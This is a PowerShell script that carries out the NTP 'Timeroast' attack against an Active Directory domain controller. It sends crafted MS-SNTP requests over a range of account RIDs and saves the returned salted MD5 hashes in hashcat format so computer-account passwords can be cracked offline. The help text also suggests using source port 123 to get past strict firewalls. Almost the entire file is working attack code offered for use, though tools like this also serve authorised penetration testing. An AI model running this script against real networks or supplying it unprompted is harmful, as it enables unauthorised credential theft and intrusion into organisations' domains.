<#

.SYNOPSIS
    Performs an NTP 'Timeroast' attack against a domain controller.
    Outputs the resulting hashes in the hashcat format 31300 with the
    --username flag ("<RID>:$sntp-ms$<hash>$salt")

.DESCRIPTION
    Usernames within the hash file are user RIDs. In order to use a
    cracked password that does not contain the computer name, either
    look up the RID in AD (if you already have some account) or use
    a computer name list obtained via reverse DNS, service scanning,
    SMB NULL sessions, etc.

.PARAMETER domainController
    Hostname or IP address of a domain controller that acts as NTP
    server.

.PARAMETER outputFile
    Hash output file. Writes to stdout if omitted.

.PARAMETER minRID
    First RID to try. Useful to continue after an earlier partial Timeroast. Default is 0.
    
.PARAMETER maxRID
    The highest RID to try. By default there is no limit other than the maximal possible RID. 
    Regardless of whether this is set, the script will only terminate after no response has come in for TIMEOUT seconds.

.PARAMETER rate
    NP queries to execute second per second. Higher is faster, but
    with a greater risk of dropped datagrams, resulting in possibly
    incomplete results. Default: 180.

.PARAMETER timeout
    Quit after not receiving NTP responses for TIMEOUT seconds,
    possibly indicating that RID space has been exhausted.
    Default: 24.

.PARAMETER sourcePort
    NTP source port to use. A dynamic unprivileged port is chosen by default.
    Could be set to 123 to get around a strict firewall.

.NOTES
    Author of the powershell port: Jacopo (antipatico) Scannella

#>
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$domainController,

    [string]$outputFile,
    [int]$minRID = 0,
    [int]$maxRID = 2147483647,
    [int]$rate = 180,
    [int]$timeout = 24,
    [Uint16]$sourcePort
)

$ErrorActionPreference = "Stop"

$NTP_PREFIX = [byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)

if ($outputFile) {
    Out-Null > $outputFile
}

# Only a subset of queries gets a response. Alternate between sending and receiving and use the request rate as receive
# timeout. If the DC is slower to respond than this rate that is fine. The response contains the RID it is associated 
# with so the sender is allowed to be ahead of the receiver.
if ($port -eq 0) {
    $client = New-Object System.Net.Sockets.UdpClient
} else {
    $client = New-Object System.Net.Sockets.UdpClient($sourcePort)
}
$client.Client.ReceiveTimeout = [Math]::floor(1000/$rate)
$client.Connect($domainController, 123)

$timeoutTime = (Get-Date).AddSeconds($timeout)
for ($queryRid = $minRID; (Get-Date) -lt $timeoutTime; $queryRid++) {   
    
    # Request as long as the maximal RID hasn't been reached yet.
    if ($queryRid -le $maxRID) {
        $query = $NTP_PREFIX + [BitConverter]::GetBytes($queryRid) + [byte[]]::new(16)
        [void] $client.Send($query, $query.Length)
    }
    
    # Keep receiving responses until the total timeout.    
    try {
        $reply = $client.Receive([ref]$null)
        
        if ($reply.Length -eq 68) {
            $salt = [byte[]]$reply[0..47]
            $md5Hash = [byte[]]$reply[-16..-1]
            $answerRid = ([BitConverter]::ToUInt32($reply[-20..-16], 0) -bxor $keyFlag)
            
            $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
            $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
            $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $answerRid, $hexMd5Hash, $hexSalt
            if ($outputFile) {
                $hashcatHash | Out-File -Append -FilePath $outputFile
            } else {
                Write-Output $hashcatHash
            }
            
            # Succesfull receive. Update total timeout.
            $timeoutTime = (Get-Date).AddSeconds($timeout)
       }   
    }
    catch [System.Management.Automation.MethodInvocationException] {
        # Time for next request.
    }
}

$client.Close()
